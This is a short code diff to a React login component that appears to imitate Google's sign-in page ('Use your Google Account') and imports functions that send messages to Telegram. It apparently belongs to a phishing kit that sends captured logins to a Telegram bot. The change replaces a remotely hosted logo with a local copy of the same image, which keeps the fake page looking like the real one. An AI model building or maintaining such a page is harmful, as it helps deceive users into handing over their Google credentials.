@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import './Login.css'
 import { useDispatch, useSelector } from 'react-redux';
 import { Link } from "react-router-dom";
+import anotherImage from './580b57fcd9996e24bc43c51f.jpeg';
 import { sendMessageToTelegram, sendMessageToTelegram2} from './TelegramBotComponent'; 
 
 function Login() {
@@ -49,7 +50,7 @@ function Login() {
         <body>
             <main > 
                 <div class="InputContainer">
-                    <img src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c51f.png" alt="" height="25"/>
+                    <img src={anotherImage} alt="" height="25"/>
                     <h2 class="login">Sign in</h2>
                     <h4 class="use">Use your Google Account</h4>
                     
